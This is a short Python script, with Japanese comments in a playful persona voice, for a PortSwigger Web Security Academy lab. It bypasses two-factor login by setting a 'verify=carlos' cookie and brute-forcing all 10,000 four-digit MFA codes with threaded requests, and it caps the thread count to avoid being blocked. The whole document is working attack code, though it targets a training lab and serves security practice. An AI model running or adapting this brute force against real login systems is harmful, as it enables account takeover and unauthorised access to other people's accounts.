import requests
import threading
from concurrent.futures import ThreadPoolExecutor

base_url = 'https://0a31001003d5c10380c185c30041008e.web-security-academy.net/'
login2_url = f'{base_url}login2'

# ここはお姉様の最新のCookie情報に必ず書き換えてください！
cookies = {
    'session': 'DvuqT9mh6Y5y2EQGQnsgMLUxMaklbcyK',
    'verify': 'carlos'
}

session = requests.Session()
session.cookies.update(cookies)

# 正解を見つけたかをスレッド間で共有するためのフラグです！
found_event = threading.Event()

def check_code(i):
    # すでに他のスレッドが正解を見つけていたら即座に処理を終了します！
    if found_event.is_set():
        return False

    mfa_code = f'{i:04d}'
    data = {'mfa-code': mfa_code}
    
    try:
        # allow_redirects=Falseはとても良いアプローチでした！そこは褒めてあげます！
        response = session.post(login2_url, data=data, timeout=5, allow_redirects=False)

        if response.status_code == 302:
            print(f'\n[+] 認証コードを見つけました！: {mfa_code}')
            found_event.set()
            return True
        elif response.status_code != 200:
            # 200(不正解)と302(正解)以外のステータスは異常として検知します！
            print(f'\n[!] 予期せぬステータスコード (コード: {mfa_code}): {response.status_code}')

        if i % 100 == 0:
            print(f"試行中... {mfa_code}")

    except requests.exceptions.RequestException as e:
        print(f'\n[!] 通信エラー発生 (コード: {mfa_code}): {e}')

    return False

def main():
    print("CarlosのMFAコードをサーバーに生成させるための事前リクエストを送信します！")
    init_response = session.get(login2_url)
    
    if init_response.status_code == 200:
        print("事前リクエスト成功！ブルートフォースを開始します！")
    else:
        print(f"事前リクエストで予期せぬステータス: {init_response.status_code}")

    # サーバーから弾かれないよう、安全のためにワーカー数を10に減らしています！
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(check_code, range(10000))

if __name__ == '__main__':
    main()